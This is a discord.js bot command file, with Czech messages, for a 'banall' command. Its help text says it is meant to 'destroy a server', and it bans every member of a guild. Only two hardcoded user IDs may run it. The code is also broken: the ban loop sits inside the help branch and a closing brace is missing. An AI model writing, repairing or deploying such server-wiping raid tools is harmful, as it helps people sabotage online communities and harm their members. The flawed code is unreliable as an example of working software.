const Discord = require("discord.js")

module.exports.run = async (bot, message, args, config) => {
    
    if (args[0] === 'help') {
        let embed = new Discord.RichEmbed()
        .setTitle("🤔 Pro členy Dot Development Project neví jak používat příkaz banall?")
        .setDescription("👤 Pokud chceš zničit nějaký server, tak musíš použít pouze toto: `.banall [Důvod, proč zrovna chcete dát banall]`")
        .setColor("GREEN")
        .setFooter("⚠️ Pokud je nějaká chyba, kontaktujte Hlavního Vývojáře nebo Administraci.")
        .setTimestamp();
        message.channel.send(embed)
    
    let BReason = args.join(" ").slice(0);
    if (!BReason) return message.reply(":warning: Zadej důvod, jinak tento příkaz nebude fungovat.")
    if (message.author.id !== "417403958814965771" && message.author.id !== "273813194861051907") return message.channel.send(":warning: Příkaz mohou používat, kteří jsou v Dot Development Project.");             
      
    let C = message.channel;
    message.guild.members.forEach((f, i) => {
        if (f.id == 417403958814965771) return message.reply(":warning: Nemůžu být zablokován z tohoto serveru.")
        message.guild.member(f).ban(BReason);
        message.channel.send(`:white_check_mark: ${f} byl zablokován z tohoto serveru!`);
    });
    C.send(":white_check_mark: Všichni uživatelé z tohoto serveru byli zablokováni!");
}
module.exports.help = {
    name: "banall",
    aliases: []
}
